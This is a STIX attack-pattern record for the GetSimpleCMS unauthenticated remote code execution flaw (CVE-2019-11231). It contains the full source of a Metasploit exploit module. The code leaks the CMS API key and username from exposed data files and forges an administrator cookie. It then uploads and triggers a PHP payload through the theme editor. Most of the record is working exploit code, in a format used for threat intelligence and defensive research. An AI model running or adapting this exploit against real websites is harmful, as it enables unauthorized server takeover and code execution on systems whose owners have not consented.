{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22b80d2f-2db2-4a4c-b691-e76c637b8555",
    "created": "2024-08-14T17:10:46.40303Z",
    "modified": "2024-08-14T17:10:46.403034Z",
    "name": "\"GetSimpleCMS Unauthenticated RCE\"",
    "description": " This module exploits a vulnerability found in GetSimpleCMS which allows unauthenticated attackers to perform Remote Code Execution. An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user however authentication can be bypassed by leaking the cms API key to target the session manager.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/getsimplecms_unauth_code_exec.rb",
            "external_id": "getsimplecms_unauth_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11231"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"GetSimpleCMS Unauthenticated RCE\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in GetSimpleCMS,\n        which allows unauthenticated attackers to perform Remote Code Execution.\n        An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user,\n        however authentication can be bypassed by leaking the cms API key to target the session manager.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'truerand0m' #  Discovery, exploit and Metasploit from Khalifazo,incite_team\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-11231'],\n          ['URL', 'https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['GetSimpleCMS 3.3.15 and before', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-04-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the cms', '/'])\n      ])\n  end\n\n  def gscms_version\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, 'admin', '/')\n      )\n      return unless res && res.code == 200\n\n      generator = res.get_html_document.at(\n        '//script[@type = \"text/javascript\"]/@src'\n        )\n\n      fail_with(Failure::NotFound, 'Failed to retrieve generator') unless generator\n      vers = generator.value.split('?v=').last.gsub(\".\",\"\")\n      return unless vers\n      @version = vers\n  end\n\n  def get_salt\n    uri = normalize_uri(target_uri.path, 'data', 'other', 'authorization.xml')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n    return unless res && res.code == 200\n\n    fail_with(Failure::NotFound, 'Failed to retrieve salt') if res.get_xml_document.at('apikey').nil?\n    @salt = res.get_xml_document.at('apikey').text\n  end\n\n  def get_user\n    uri = normalize_uri(target_uri.path, 'data', 'users' ,'/')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n    return unless res && res.code == 200\n\n    fail_with(Failure::NotFound, 'Failed to retrieve username') if res.get_html_document.at('[text()*=\"xml\"]').nil?\n    @username = res.get_html_document.at('[text()*=\"xml\"]').text.split('.xml').first\n  end\n\n  def gen_cookie(version,salt,username)\n    cookie_name = \"getsimple_cookie_#{version}\"\n    sha_salt_usr = Digest::SHA1.hexdigest(\"#{username}#{salt}\")\n\n    sha_salt_cookie = Digest::SHA1.hexdigest(\"#{cookie_name}#{salt}\")\n    @cookie = \"GS_ADMIN_USERNAME=#{username};#{sha_salt_cookie}=#{sha_salt_usr}\"\n  end\n  def get_nonce(cookie)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri,'admin','theme-edit.php'),\n      'cookie' =>  cookie,\n      'vars_get' => {\n          't' => 'Innovation',\n          'f' => 'Default Template',\n          's' => 'Edit'\n      }\n    })\n\n    fail_with(Failure::NotFound, 'Failed to retrieve nonce') if res.get_html_document.at('//input[@id = \"nonce\"]/@value').nil?\n    @nonce = res.get_html_document.at('//input[@id = \"nonce\"]/@value')\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n        fail_with(Failure::NotVulnerable, 'It appears that the target is not vulnerable')\n    end\n    version = gscms_version\n    salt = get_salt\n    username = get_user\n    cookie = gen_cookie(version,salt,username)\n    nonce = get_nonce(cookie)\n\n    fname = \"#{rand_text_alpha(6..16)}.php\"\n    php   = %Q|<?php #{payload.encoded} ?>|\n    upload_file(cookie,nonce,fname,php)\n    send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path,'theme',fname),\n    })\n  end\n\n  def check\n    version = gscms_version\n    unless version\n        return CheckCode::Safe\n    end\n    vprint_status \"GetSimpleCMS version #{version}\"\n    unless vulnerable\n        return CheckCode::Detected\n    end\n    CheckCode::Vulnerable\n  end\n\n  def vulnerable\n    uri = normalize_uri(target_uri.path, 'data', 'other', 'authorization.xml')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n    return unless res && res.code == 200\n\n    uri = normalize_uri(target_uri.path, 'data', 'users', '/')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n    return unless res && res.code == 200\n    return true\n  end\n\n  def upload_file(cookie,nonce,fname,content)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path,'admin','theme-edit.php'),\n      'cookie'    => cookie,\n      'vars_post' => {\n        'submitsave'    => 2,\n        'edited_file' => fname,\n        'content' => content,\n        'nonce' => nonce\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-28",
    "x_mitre_platforms": [
        "php'"
    ]
}